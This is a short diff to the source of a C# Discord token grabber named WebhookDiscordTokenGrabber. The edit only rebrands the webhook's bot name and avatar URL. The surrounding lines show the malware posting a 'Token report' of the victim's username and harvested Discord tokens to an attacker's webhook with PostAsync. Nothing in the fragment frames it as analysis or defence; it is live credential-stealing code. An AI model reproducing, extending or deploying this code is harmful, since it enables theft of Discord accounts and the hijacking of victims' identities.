@@ -153,8 +153,8 @@ namespace WebhookDiscordTokenGrabber
                     Dictionary<string, string> contents = new Dictionary<string, string>
                     {
                         { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", writtenldbtoken)}" },
-                        { "username", "Anarchy Token Grabber" },
-                        { "avatar_url", "https://cdn.discordapp.com/attachments/737777108243316807/737788069192794122/kai_green_eye_and_contur.jpeg" }
+                        { "username", "WDTG by Kai" },
+                        { "avatar_url", "https://cdn.discordapp.com/attachments/737989668242456688/737989908324417607/wdtg_avatar.PNG" }
                     };
 
                     client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
